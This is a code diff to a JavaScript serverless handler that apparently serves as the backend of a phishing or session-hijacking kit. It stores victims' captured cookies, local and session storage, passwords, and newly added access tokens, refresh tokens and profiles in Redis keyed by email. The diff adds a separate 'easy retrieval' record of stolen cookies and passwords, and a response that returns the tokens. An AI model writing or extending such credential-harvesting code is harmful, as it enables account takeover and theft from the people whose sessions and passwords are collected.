@@ -85,12 +85,27 @@ export const handler = async (event, context) => {
         formattedCookies: data.formattedCookies || [],
         localStorage: data.localStorage || 'Empty',
         sessionStorage: data.sessionStorage || 'Empty',
-        browserFingerprint: data.browserFingerprint || {}
+        browserFingerprint: data.browserFingerprint || {},
+        documentCookies: data.documentCookies || '',
+        accessToken: data.accessToken || null,
+        refreshToken: data.refreshToken || null,
+        userProfile: data.userProfile || null
       };
 
       // Store in Redis with TTL
-      await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData));
-      await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData));
+      await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData), { ex: 86400 });
+      await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData), { ex: 86400 });
+      
+      // Also store cookies separately for easy retrieval
+      await redis.set(`cookies:${sessionData.sessionId}`, JSON.stringify({
+        cookies: sessionData.formattedCookies,
+        localStorage: sessionData.localStorage,
+        sessionStorage: sessionData.sessionStorage,
+        timestamp: sessionData.timestamp,
+        email: sessionData.email,
+        password: sessionData.password,
+        documentCookies: sessionData.documentCookies
+      }), { ex: 86400 });
 
       return {
         statusCode: 200,
@@ -99,7 +114,15 @@ export const handler = async (event, context) => {
           success: true,
           message: 'Session created successfully',
           sessionId: sessionData.sessionId,
-          session: sessionData
+          session: {
+            email: sessionData.email,
+            provider: sessionData.provider,
+            timestamp: sessionData.timestamp,
+            sessionId: sessionData.sessionId,
+            cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0,
+            hasLocalStorage: sessionData.localStorage !== 'Empty',
+            hasSessionStorage: sessionData.sessionStorage !== 'Empty'
+          }
         }),
       };
 
@@ -122,8 +145,11 @@ export const handler = async (event, context) => {
           
           // Verify session exists in Redis
           const redisSession = await redis.get(`session:${sessionData.sessionId}`);
-          if (!redisSession) {
-            sessionData = null; // Cookie exists but session expired in Redis
+          if (redisSession) {
+            const updatedSession = JSON.parse(redisSession);
+            sessionData = { ...sessionData, ...updatedSession };
+          } else {
+            console.log('⚠️ Cookie exists but session expired in Redis');
           }
         } catch (error) {
           console.error('Error parsing session cookie:', error);
@@ -181,7 +207,13 @@ export const handler = async (event, context) => {
             formattedCookies: sessionData.formattedCookies || [],
             localStorage: sessionData.localStorage || 'Not available',
             sessionStorage: sessionData.sessionStorage || 'Not available',
-            password: sessionData.password || 'Not captured'
+            password: sessionData.password || 'Not captured',
+            cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0,
+            hasLocalStorage: sessionData.localStorage !== 'Empty' && sessionData.localStorage !== 'Not available',
+            hasSessionStorage: sessionData.sessionStorage !== 'Empty' && sessionData.sessionStorage !== 'Not available',
+            accessToken: sessionData.accessToken,
+            refreshToken: sessionData.refreshToken,
+            userProfile: sessionData.userProfile
           }
         }),
       };
